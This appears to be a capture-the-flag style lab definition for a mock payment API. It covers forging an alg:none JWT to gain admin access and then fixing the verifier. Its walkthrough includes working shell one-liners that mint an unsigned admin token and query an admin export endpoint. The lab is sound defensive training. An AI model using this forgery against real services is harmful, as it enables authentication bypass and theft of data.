title: Unsigned Authority
subtitle: Forge an admin token against Aurora Pay's JWT verifier
summary: Aurora Pay issues HS256 partner tokens but its verifier trusts the algorithm named inside the token. Mint an unsigned admin token, read the merchant export, then close the flaw.
scenario: You are assessing the Aurora Pay partner API. Tokens are standard HS256 JWTs, yet the verifier reads the algorithm from the token header instead of enforcing an allow-list. Prove the impact with an unsigned admin token, capture the export marker, and then make the verifier reject alg:none while keeping legitimate partner tokens working.
learningObjectives: Explain how trusting the JWT header algorithm enables forgery
Forge an unsigned admin token against a live API
Apply an allow-list policy and verify both denial and normal operation
authorizedScope: Only the Aurora Pay training API inside this session. Merchant data is synthetic.
riskSummary: Accepting the token-supplied algorithm lets an unauthenticated attacker claim any role. Real-world variants allow key confusion and total authentication bypass.
remediation: Pin the expected algorithm server-side, verify signatures with a constant-time comparison, reject unsigned tokens unconditionally, and validate claims such as iss/aud/exp.
conclusion: You minted an unsigned admin JWT and exported merchant data, then fixed the verifier so unsigned tokens are rejected while correctly signed partner tokens still authenticate.

objectives.title: Forge an admin token
objectives.description: Log in as the partner account, decode the JWT, then construct a token with alg=none and role=admin. Query the admin export endpoint with it and submit the marker inside the export note.
objectives.evidencePrompt: Submit the CF{...} marker from the admin export.

hints.text: A JWT is three base64url parts. Set the header to {"alg":"none","typ":"JWT"} and the payload role to "admin", then keep a trailing dot for the empty signature.

objectives.title: Reject unsigned tokens
objectives.description: Enable the verifier policy that requires a signed algorithm. The live check submits an unsigned admin token (must be 401) and a genuine partner token (must be 403, not 401).

criteria: signed partner token authenticates but is forbidden

hints.text: Apply `{"rejectAlgNone": true}` with `labctl policy apply -` and re-run the objective check.

walkthrough.title: Get a legitimate token
walkthrough.body: Log in as the partner account to see the real token shape.
walkthrough.snippet: TOKEN=$(curl -s -X POST -H 'content-type: application/json' -d '{"email":"analyst@aurorapay.example","password":"aurora2024"}' $CF_TARGET_URL/api/login | jq -r .token); echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null; echo

walkthrough.title: Forge an unsigned admin token
walkthrough.body: Claim the admin role with alg=none. The signature segment is empty.
walkthrough.snippet: H=$(printf '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '='); P=$(printf '{"sub":"x","role":"admin","exp":9999999999}' | base64 -w0 | tr '+/' '-_' | tr -d '='); FORGED="$H.$P."; curl -s -H "Authorization: Bearer $FORGED" $CF_TARGET_URL/api/admin/export

walkthrough.title: Fix the verifier
walkthrough.body: Switch on the policy and confirm the unsigned token is rejected.
